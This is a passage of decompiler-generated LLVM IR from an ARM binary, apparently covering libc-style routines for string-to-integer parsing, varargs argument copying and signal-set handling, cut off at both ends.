  %v2_107e4 = xor i1 %v2_107dc, true
  %v3_107e4 = or i1 %v7_107dc, %v2_107e4
  br i1 %v3_107e4, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  store i32 1, i32* @r4, align 4
  br label %bb28

bb28:                                             ; preds = %.thread12, %bb24, %bb23, %bb26, %bb27
  %v1_107f4 = phi i32 [ 3, %bb24 ], [ %v1_107ec9, %bb23 ], [ %v1_107ec8, %bb26 ], [ 1, %bb27 ], [ 0, %.thread12 ]
  store i32 ptrtoint (i32* @global_var_16e60.489 to i32), i32* %r2.global-to-local, align 4
  %v4_107ec = mul i32 %v1_107f4, 4
  %v5_107ec = add i32 %v4_107ec, ptrtoint (i32* @global_var_16e60.489 to i32)
  store i32 %v5_107ec, i32* %r3.global-to-local, align 4
  %v1_107f0 = add i32 %v4_107ec, add (i32 ptrtoint (i32* @global_var_16e60.489 to i32), i32 20)
  %v2_107f0 = inttoptr i32 %v1_107f0 to i32*
  %v3_107f0 = load i32, i32* %v2_107f0, align 4
  store i32 %v3_107f0, i32* %r1.global-to-local, align 4
  %v6_107f4 = inttoptr i32 %v5_107ec to i32*
  %v7_107f4 = load i32, i32* %v6_107f4, align 4
  store i32 %v7_107f4, i32* %r2.global-to-local, align 4
  %v1_107f8 = add i32 %tmp, 4
  store i32 %v1_107f8, i32* @r6, align 4
  %v4_107fc = mul i32 %v3_107f0, 4
  %v5_107fc = add i32 %v4_107fc, %v1_107f8
  store i32 %v5_107fc, i32* %r3.global-to-local, align 4
  %v2_10800 = add i32 %arg4, 24
  %v3_10800 = inttoptr i32 %v2_10800 to i32*
  store i32 %v5_107fc, i32* %v3_10800, align 4
  %v0_10804 = load i32, i32* %r2.global-to-local, align 4
  %v1_10804 = load i32, i32* @r5, align 4
  %v2_10804 = add i32 %v1_10804, 20
  %v3_10804 = inttoptr i32 %v2_10804 to i32*
  store i32 %v0_10804, i32* %v3_10804, align 4
  %v0_10808 = load i32, i32* %r1.global-to-local, align 4
  %v1_10808 = load i32, i32* @r5, align 4
  %v2_10808 = add i32 %v1_10808, 16
  %v3_10808 = inttoptr i32 %v2_10808 to i32*
  store i32 %v0_10808, i32* %v3_10808, align 4
  %v0_1080c = load i32, i32* @r4, align 4
  %v1_1080c = load i32, i32* @r5, align 4
  %v2_1080c = add i32 %v1_1080c, 12
  %v3_1080c = inttoptr i32 %v2_1080c to i32*
  store i32 %v0_1080c, i32* %v3_1080c, align 4
  %v0_10810 = load i32, i32* @r6, align 4
  %v1_10810 = load i32, i32* @r5, align 4
  %v2_10810 = add i32 %v1_10810, 8
  %v3_10810 = inttoptr i32 %v2_10810 to i32*
  store i32 %v0_10810, i32* %v3_10810, align 4
  %v0_10814 = load i32, i32* @r5, align 4
  store i32 %v0_10814, i32* %r1.global-to-local, align 4
  %v0_10818 = load i32, i32* @r0, align 4
  %v2_10818 = inttoptr i32 %v0_10818 to i32*
  %v3_10818 = call i32 @function_106d4(i32* %v2_10818, i32 %v0_10814)
  store i32 %v3_10818, i32* %r0.global-to-local, align 4
  %v0_1081c = load i32, i32* @r4, align 4
  %v2_1081c = icmp eq i32 %v0_1081c, 0
  br i1 %v2_1081c, label %bb29, label %.thread6

bb29:                                             ; preds = %bb28
  %v1_1083814 = load i32, i32* @r7, align 4
  %v2_1083815 = inttoptr i32 %v1_1083814 to i32*
  store i32 0, i32* %v2_1083815, align 4
  %v1_1083c = load i32, i32* @r4, align 4
  store i32 %v1_1083c, i32* %r0.global-to-local, align 4
  br label %bb30

.thread6:                                         ; preds = %bb28
  %v1_10820 = load i32, i32* @r5, align 4
  %v2_10820 = add i32 %v1_10820, 4
  %v3_10820 = inttoptr i32 %v2_10820 to i32*
  %v4_10820 = load i32, i32* %v3_10820, align 4
  %v1_10824 = load i32, i32* @r6, align 4
  %v3_10824 = sub i32 %v4_10820, %v1_10824
  %v4_10828 = sdiv i32 %v3_10824, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10830 = mul i32 %v4_10828, 5
  %v5_10830 = add i32 %v4_10830, %v0_1081c
  store i32 %v5_10830, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10838 = load i32, i32* @r7, align 4
  %v2_10838 = inttoptr i32 %v1_10838 to i32*
  store i32 0, i32* %v2_10838, align 4
  %v1_10840 = load i32, i32* %r3.global-to-local, align 4
  %v2_10840 = load i32, i32* @r7, align 4
  %v3_10840 = inttoptr i32 %v2_10840 to i32*
  store i32 %v1_10840, i32* %v3_10840, align 4
  %v17_10844.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb30

bb30:                                             ; preds = %bb29, %.thread6
  %v17_10844 = phi i32 [ %v1_1083c, %bb29 ], [ %v17_10844.pre, %.thread6 ]
  %v2_10844 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10844, i32* %r4.global-to-local, align 4
  ret i32 %v17_10844

dec_label_pc_10848:                               ; preds = %dec_label_pc_107cc
  %v0_10848 = call i32 @function_cec4()
  store i32 %v0_10848, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r4.global-to-local, align 4
  %v2_10850 = inttoptr i32 %v0_10848 to i32*
  store i32 22, i32* %v2_10850, align 4
  %v0_10854 = call i32 @function_cec4()
  %v0_10858 = load i32, i32* %r4.global-to-local, align 4
  %v2_10858 = inttoptr i32 %v0_10854 to i32*
  store i32 %v0_10858, i32* %v2_10858, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10860 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10860, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i1 %v7_107dc, { 1, 0 }
  uselistorder i1 %v7_107b4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 2, 3, 1, 5 }
  uselistorder i32 (i32*, i32)* @function_106d4, { 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg3, { 3, 4, 0, 1, 6, 5, 2, 7 }
  uselistorder label %bb30, { 1, 0 }
  uselistorder label %bb28, { 4, 3, 0, 1, 2 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %.thread1, { 2, 1, 0 }
}

define i32 @function_10868(i8* %arg1) local_unnamed_addr {
dec_label_pc_10868:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_1087c = load i32, i32* @r4, align 4
  store i32 %v3_1087c, i32* %stack_var_-36, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  %v2_108a0.pre = load i32, i32* @global_var_18428, align 4
  br label %dec_label_pc_10898

dec_label_pc_10898:                               ; preds = %dec_label_pc_10898, %dec_label_pc_10868
  %v0_108d0 = phi i32 [ %tmp, %dec_label_pc_10868 ], [ %v1_10894, %dec_label_pc_10898 ]
  store i32 %v0_108d0, i32* %r4.global-to-local, align 4
  %v1_1089c = inttoptr i32 %v0_108d0 to i8*
  %v2_1089c = load i8, i8* %v1_1089c, align 1
  %v3_1089c = zext i8 %v2_1089c to i32
  %v3_108a4 = mul nuw nsw i32 %v3_1089c, 2
  %v4_108a4 = add i32 %v3_108a4, %v2_108a0.pre
  %v5_108a4 = inttoptr i32 %v4_108a4 to i8*
  %v6_108a4 = load i8, i8* %v5_108a4, align 1
  %v1_108a8 = and i8 %v6_108a4, 32
  %v2_108a8 = icmp eq i8 %v1_108a8, 0
  %v1_10894 = add i32 %v0_108d0, 1
  br i1 %v2_108a8, label %dec_label_pc_108b0, label %dec_label_pc_10898

dec_label_pc_108b0:                               ; preds = %dec_label_pc_10898
  %v7_108b0 = icmp eq i8 %v2_1089c, 43
  br i1 %v7_108b0, label %dec_label_pc_108d0, label %dec_label_pc_108b8

dec_label_pc_108b8:                               ; preds = %dec_label_pc_108b0
  %v7_108b8 = icmp eq i8 %v2_1089c, 45
  br i1 %v7_108b8, label %dec_label_pc_108d0, label %bb

bb:                                               ; preds = %dec_label_pc_108b8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_108d0:                               ; preds = %dec_label_pc_108b0, %dec_label_pc_108b8
  %storemerge30 = phi i32 [ 1, %dec_label_pc_108b8 ], [ 0, %dec_label_pc_108b0 ]
  store i32 %storemerge30, i32* %r7.global-to-local, align 4
  store i32 %v1_10894, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %bb, %dec_label_pc_108d0
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v2_10934 = call i32 @function_ca30(i32 -1, i32 10)
  %v0_10938 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10938, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v1_10944 = urem i32 %v2_10934, 256
  store i32 %v1_10944, i32* %sl.global-to-local, align 4
  %v0_10948 = call i32 @function_14d90()
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_10948, i32* %r8.global-to-local, align 4
  %v0_1095c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_10958:                               ; preds = %bb48, %dec_label_pc_109b8
  %v0_10958 = phi i32 [ %v1_10988, %bb48 ], [ %v0_10958.pre, %dec_label_pc_109b8 ]
  store i32 %v0_10958, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1095c

dec_label_pc_1095c:                               ; preds = %dec_label_pc_1092c, %dec_label_pc_10958
  %v0_10988 = phi i32 [ %v0_1095c.pre, %dec_label_pc_1092c ], [ %v0_10958, %dec_label_pc_10958 ]
  %v1_1095c = inttoptr i32 %v0_10988 to i8*
  %v2_1095c = load i8, i8* %v1_1095c, align 1
  %v3_1095c = zext i8 %v2_1095c to i32
  %v1_10960 = add nsw i32 %v3_1095c, -48
  %v1_10964 = urem i32 %v1_10960, 256
  %v1_1096c = or i32 %v3_1095c, 32
  %tmp56 = icmp ult i32 %v1_10964, 10
  br i1 %tmp56, label %bb43, label %dec_label_pc_10974

dec_label_pc_10974:                               ; preds = %dec_label_pc_1095c
  %tmp57 = icmp ugt i32 %v1_1096c, 96
  br i1 %tmp57, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10974
  %v1_10978 = add nsw i32 %v1_1096c, -87
  %v5_10980 = urem i32 %v1_10978, 256
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_1095c, %dec_label_pc_10974, %bb42
  %v3_109b0 = phi i32 [ %v1_10964, %dec_label_pc_1095c ], [ 40, %dec_label_pc_10974 ], [ %v5_10980, %bb42 ]
  %v1_10984 = load i32, i32* %r5.global-to-local, align 4
  %v1_10988 = add i32 %v0_10988, 1
  store i32 %v1_10988, i32* %r4.global-to-local, align 4
  %v6_1098c = icmp slt i32 %v3_109b0, %v1_10984
  br i1 %v6_1098c, label %dec_label_pc_10990, label %dec_label_pc_109d0

dec_label_pc_10990:                               ; preds = %bb43
  %v0_10990 = load i32, i32* %ip.global-to-local, align 4
  %v1_10990 = load i32, i32* %r8.global-to-local, align 4
  %v9_10990 = icmp eq i32 %v0_10990, %v1_10990
  br i1 %v9_10990, label %.thread, label %bb44

.thread:                                          ; preds = %dec_label_pc_10990
  br label %dec_label_pc_109a0

bb44:                                             ; preds = %dec_label_pc_10990
  %v3_10990 = icmp ult i32 %v0_10990, %v1_10990
  br i1 %v3_10990, label %dec_label_pc_109a0, label %dec_label_pc_109b8

dec_label_pc_109a0:                               ; preds = %bb44, %.thread
  %v4_109a81727 = phi i32 [ 1, %.thread ], [ 0, %bb44 ]
  %v1_109a0 = load i32, i32* %sl.global-to-local, align 4
  %v3_109a0 = icmp uge i32 %v3_109b0, %v1_109a0
  %v9_109a0 = icmp eq i32 %v3_109b0, %v1_109a0
  %v2_109a4 = xor i1 %v3_109a0, true
  %v3_109a4 = or i1 %v9_109a0, %v2_109a4
  br i1 %v3_109a4, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_109a0
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_109a0, %bb45
  %v4_109a8 = phi i32 [ %v4_109a81727, %dec_label_pc_109a0 ], [ 0, %bb45 ]
  %v2_109a8 = xor i1 %v9_109a0, true
  %v3_109a8 = and i1 %v3_109a0, %v2_109a8
  br i1 %v3_109a8, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_109a8 = urem i32 %v4_109a8, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_109ac = phi i32 [ %v5_109a8, %bb47 ], [ %v4_109a8, %bb46 ]
  %v2_109ac = icmp eq i32 %v0_109ac, 0
  br i1 %v2_109ac, label %bb48, label %dec_label_pc_109b8

bb48:                                             ; preds = %thread-pre-split
  %v4_109b0 = mul i32 %v0_10990, %v1_10984
  %v5_109b0 = add i32 %v4_109b0, %v3_109b0
  store i32 %v5_109b0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10958

dec_label_pc_109b8:                               ; preds = %bb44, %thread-pre-split
  %v0_109b8 = call i32 @function_cec4()
  %v0_109bc = load i32, i32* %r7.global-to-local, align 4
  %v1_109bc = load i32, i32* %fp.global-to-local, align 4
  %v2_109bc = and i32 %v1_109bc, %v0_109bc
  store i32 %v2_109bc, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_109c8 = inttoptr i32 %v0_109b8 to i32*
  store i32 34, i32* %v2_109c8, align 4
  %v0_10958.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10958

dec_label_pc_109d0:                               ; preds = %bb43
  %v0_109d0.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_109d0 = icmp eq i32 %v0_109d0.pre, 0
  br i1 %v2_109d0, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_109d0
  %v1_109d4 = load i32, i32* %r6.global-to-local, align 4
  %v3_109d4 = inttoptr i32 %v0_109d0.pre to i32*
  store i32 %v1_109d4, i32* %v3_109d4, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_109d0, %bb49
  %v0_109d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_109d8 = icmp eq i32 %v0_109d8, 0
  %. = select i1 %v2_109d8, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_109e4 = load i32, i32* %fp.global-to-local, align 4
  %v2_109e4 = icmp eq i32 %v0_109e4, 0
  %v0_10a08.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_109e4, label %dec_label_pc_10a00, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_10a08.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_109f0, label %dec_label_pc_10a00

dec_label_pc_109f0:                               ; preds = %bb53
  %v0_109f0 = call i32 @function_cec4()
  %v2_109f8 = inttoptr i32 %v0_109f0 to i32*
  store i32 34, i32* %v2_109f8, align 4
  %v0_109fc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_109fc, i32* %ip.global-to-local, align 4
  %v0_10a00.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10a00

dec_label_pc_10a00:                               ; preds = %bb53, %bb50, %dec_label_pc_109f0
  %v0_10a08.pre = phi i32 [ %v0_10a08.pre.pre, %bb53 ], [ %v0_109fc, %dec_label_pc_109f0 ], [ %v0_10a08.pre.pre, %bb50 ]
  %v0_10a00 = phi i32 [ %v0_109d8, %bb53 ], [ %v0_10a00.pre, %dec_label_pc_109f0 ], [ %v0_109d8, %bb50 ]
  %v2_10a00 = icmp eq i32 %v0_10a00, 0
  br i1 %v2_10a00, label %dec_label_pc_10a00._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_10a00
  %v2_10a04 = sub i32 0, %v0_10a08.pre
  store i32 %v2_10a04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10a00._crit_edge

dec_label_pc_10a00._crit_edge:                    ; preds = %dec_label_pc_10a00, %bb54
  %v0_10a08 = phi i32 [ %v2_10a04, %bb54 ], [ %v0_10a08.pre, %dec_label_pc_10a00 ]
  %v2_10a0c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_10a0c, i32* @r4, align 4
  ret i32 %v0_10a08

; uselistorder directives
  uselistorder i32 %v0_10a08.pre, { 1, 0 }
  uselistorder i32 %v0_10a08.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_109d0.pre, { 1, 0 }
  uselistorder i32 %v4_109a8, { 1, 0 }
  uselistorder i1 %v3_109a0, { 1, 0 }
  uselistorder i32 %v1_109a0, { 1, 0 }
  uselistorder i32 %v1_10988, { 1, 0 }
  uselistorder i32 %v1_1096c, { 1, 0 }
  uselistorder i32 %v1_10964, { 1, 0 }
  uselistorder i32 %v0_10958, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 2, 1, 3, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32 -87, { 1, 0 }
  uselistorder label %dec_label_pc_10a00._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10a00, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_109b8, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 0 }
  uselistorder label %dec_label_pc_10958, { 1, 0 }
  uselistorder label %dec_label_pc_1092c, { 1, 0 }
  uselistorder label %dec_label_pc_108d0, { 1, 0 }
}

define i32 @function_10a14(i32 %arg1) local_unnamed_addr {
dec_label_pc_10a14:
  %stack_var_-16 = alloca i32, align 4
  %v2_10a14 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_10a14, i32* @r0, align 4
  %v1_10a30 = call i32 @function_10d54()
  %v1_10a40 = call i32 @function_10d4c()
  %v2_10a48 = load i32, i32* @global_var_1aaac.497, align 4
  %v2_10a4c = icmp eq i32 %v2_10a48, 0
  br i1 %v2_10a4c, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_10a14
  call void @__pseudo_branch(i32 %v2_10a48)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_10a14, %bb
  store i32 %v2_10a14, i32* @r0, align 4
  %v1_10a6c = call i32 @function_10d54()
  store i32 %v1_10a6c, i32* @r0, align 4
  %v1_10a70 = call i32 @function_10ce0(i32 %v1_10a6c)
  store i32 68228, i32* @lr, align 4
  %v2_10a80 = call i32 @function_d810()
  %v0_10a84 = load i32, i32* @r4, align 4
  %v1_10a88 = call i32 @function_11248(i32 %v0_10a84)
  unreachable

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_10aa8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_10aa8:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10aa8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10aa8, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-8, align 4
  %v2_10ab8 = ptrtoint i32* %stack_var_-32 to i32
  %v2_10abc = ptrtoint i32* %stack_var_-8 to i32
  store i32 %v2_10abc, i32* %stack_var_-32, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10ac8

dec_label_pc_10ac8:                               ; preds = %dec_label_pc_10ac8, %dec_label_pc_10aa8
  %v0_10adc = phi i32 [ %v1_10adc, %dec_label_pc_10ac8 ], [ 0, %dec_label_pc_10aa8 ]
  %v3_10ac8 = phi i32 [ %v1_10ad0, %dec_label_pc_10ac8 ], [ %v2_10abc, %dec_label_pc_10aa8 ]
  %v1_10acc = inttoptr i32 %v3_10ac8 to i32*
  %v2_10acc = load i32, i32* %v1_10acc, align 4
  %v1_10ad0 = add i32 %v3_10ac8, 4
  %v2_10ad4 = icmp eq i32 %v2_10acc, 0
  store i32 %v1_10ad0, i32* %stack_var_-32, align 4
  %v1_10adc = add i32 %v0_10adc, 1
  store i32 %v1_10adc, i32* %lr.global-to-local, align 4
  br i1 %v2_10ad4, label %dec_label_pc_10ae4, label %dec_label_pc_10ac8

dec_label_pc_10ae4:                               ; preds = %dec_label_pc_10ac8
  %v3_10ae4.neg = mul i32 %v1_10adc, -4
  %v1_10ae8.neg = add i32 %v2_10ab8, -8
  %v2_10aec = add i32 %v1_10ae8.neg, %v3_10ae4.neg
  %v2_10af4 = inttoptr i32 %v2_10aec to i32*
  store i32 %arg1, i32* %v2_10af4, align 4
  store i32 %v2_10abc, i32* %stack_var_-32, align 4
  %v0_10b00 = load i32, i32* @sp, align 4
  store i32 %v0_10b00, i32* @r1, align 4
  store i32 %v0_10b00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10b08

dec_label_pc_10b08:                               ; preds = %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge, %dec_label_pc_10ae4
  %v1_10b1c = phi i32 [ %v5_10b1c, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge ], [ %v0_10b00, %dec_label_pc_10ae4 ]
  %v3_10b08 = phi i32 [ %v3_10b08.pre, %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge ], [ %v2_10abc, %dec_label_pc_10ae4 ]
  %v1_10b0c = inttoptr i32 %v3_10b08 to i32*
  %v2_10b0c = load i32, i32* %v1_10b0c, align 4
  %v0_10b10 = load i32, i32* %lr.global-to-local, align 4
  %v1_10b10 = add i32 %v0_10b10, -1
  store i32 %v1_10b10, i32* %lr.global-to-local, align 4
  %v7_10b10 = icmp eq i32 %v0_10b10, 1
  %v1_10b14 = add i32 %v3_10b08, 4
  store i32 %v1_10b14, i32* %stack_var_-32, align 4
  %v2_10b1c = add i32 %v1_10b1c, 4
  %v3_10b1c = inttoptr i32 %v2_10b1c to i32*
  store i32 %v2_10b0c, i32* %v3_10b1c, align 4
  %v4_10b1c = load i32, i32* %ip.global-to-local, align 4
  %v5_10b1c = add i32 %v4_10b1c, 4
  store i32 %v5_10b1c, i32* %ip.global-to-local, align 4
  br i1 %v7_10b10, label %dec_label_pc_10b24, label %dec_label_pc_10b08.dec_label_pc_10b08_crit_edge

dec_label_pc_10b08.dec_label_pc_10b08_crit_edge:  ; preds = %dec_label_pc_10b08
  %v3_10b08.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_10b08

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b08
  %v2_10b28 = load i32, i32* @global_var_1aab4.502, align 4
  store i32 %v2_10b28, i32* @r2, align 4
  %v0_10b2c = call i32 @function_1129c()
  ret i32 %v0_10b2c

; uselistorder directives
  uselistorder i32 %v5_10b1c, { 1, 0 }
  uselistorder i32 %v0_10b10, { 1, 0 }
  uselistorder i32 %v1_10adc, { 0, 2, 1 }
  uselistorder i32 %v1_10ad0, { 1, 0 }
  uselistorder i32 %v3_10ac8, { 1, 0 }
  uselistorder i32 %v2_10abc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @function_10b3c(i32 %arg1) local_unnamed_addr {
dec_label_pc_10b3c:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_10b3c = load i32, i32* @r4, align 4
  store i32 %v3_10b3c, i32* %stack_var_-20, align 4
  %v6_10b3c = load i32, i32* @r5, align 4
  %v9_10b3c = load i32, i32* @r6, align 4
  %v16_10b3c = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_10b40 = icmp eq i32 %arg1, 0
  %v2_10b44 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_10b40, label %dec_label_pc_10cc8, label %dec_label_pc_10b5c.preheader

dec_label_pc_10b5c.preheader:                     ; preds = %dec_label_pc_10b3c
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_10b6417 = add i32 %v16_10b3c, 124
  br label %dec_label_pc_10b54

dec_label_pc_10b54:                               ; preds = %dec_label_pc_10b5c.preheader, %dec_label_pc_10b54
  %v5_10b6418 = phi i32 [ %v5_10b6417, %dec_label_pc_10b5c.preheader ], [ %v5_10b64, %dec_label_pc_10b54 ]
  %v2_10b58 = add i32 %v5_10b6418, -136
  %v3_10b58 = inttoptr i32 %v2_10b58 to i32*
  store i32 0, i32* %v3_10b58, align 4
  %v0_10b5c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10b5c = add i32 %v0_10b5c.pre, -1
  store i32 %v1_10b5c, i32* %r1.global-to-local, align 4
  %v6_10b5c = icmp slt i32 %v1_10b5c, 0
  %v4_10b64 = mul i32 %v1_10b5c, 4
  %v5_10b64 = add i32 %v4_10b64, %v16_10b3c
  br i1 %v6_10b5c, label %dec_label_pc_10b6c, label %dec_label_pc_10b54

dec_label_pc_10b6c:                               ; preds = %dec_label_pc_10b54
  %v2_10b6c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_10b6c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v0_10b7c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_10b7c, i32* %stack_var_-28, align 4
  %v2_10b84 = call i32 @function_136e0(i32 %v2_10b6c, i32 17)
  store i32 %v2_10b84, i32* %r0.global-to-local, align 4
  %v1_10b88 = load i32, i32* @r5, align 4
  %v5_10b8c = icmp slt i32 %v2_10b84, %v1_10b88
  br i1 %v5_10b8c, label %dec_label_pc_10cd0, label %dec_label_pc_10b90

dec_label_pc_10b90:                               ; preds = %dec_label_pc_10b6c
  %v2_10b90 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_10b90, i32* @r4, align 4
  store i32 %v1_10b88, i32* %r0.global-to-local, align 4
  store i32 %v2_10b6c, i32* %r1.global-to-local, align 4
  %v3_10ba0 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_10ba0 = call i32 @function_11494(i32 %v1_10b88, %_TYPEDEF_sigset_t* %v3_10ba0, i32 %v2_10b90)
  store i32 %v4_10ba0, i32* %r0.global-to-local, align 4
  %v1_10ba4 = load i32, i32* @r5, align 4
  %v9_10ba4 = icmp eq i32 %v4_10ba0, %v1_10ba4
  br i1 %v9_10ba4, label %dec_label_pc_10bac, label %dec_label_pc_10cd0

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b90
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_10b90, i32* %r0.global-to-local, align 4
  %v2_10bb4 = call i32 @function_136bc(i32 %v2_10b90, i32 17)
  store i32 %v2_10bb4, i32* %r0.global-to-local, align 4
  %v1_10bb8 = load i32, i32* @r5, align 4
  %v9_10bb8 = icmp eq i32 %v2_10bb4, %v1_10bb8
  br i1 %v9_10bb8, label %dec_label_pc_10bd0.preheader, label %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge

dec_label_pc_10bac.dec_label_pc_10c98_crit_edge:  ; preds = %dec_label_pc_10bac
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_10c98

dec_label_pc_10bd0.preheader:                     ; preds = %dec_label_pc_10bac
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bd0.preheader, %dec_label_pc_10bc8
  %v5_10bd816 = phi i32 [ %v5_10b6417, %dec_label_pc_10bd0.preheader ], [ %v5_10bd8, %dec_label_pc_10bc8 ]
  %v2_10bcc = add i32 %v5_10bd816, -136
  %v3_10bcc = inttoptr i32 %v2_10bcc to i32*
  store i32 0, i32* %v3_10bcc, align 4
  %v0_10bd0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10bd0 = add i32 %v0_10bd0.pre, -1
  store i32 %v1_10bd0, i32* %r1.global-to-local, align 4
  %v6_10bd0 = icmp slt i32 %v1_10bd0, 0
  %v4_10bd8 = mul i32 %v1_10bd0, 4
  %v5_10bd8 = add i32 %v4_10bd8, %v16_10b3c
  br i1 %v6_10bd0, label %dec_label_pc_10be0, label %dec_label_pc_10bc8

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bc8
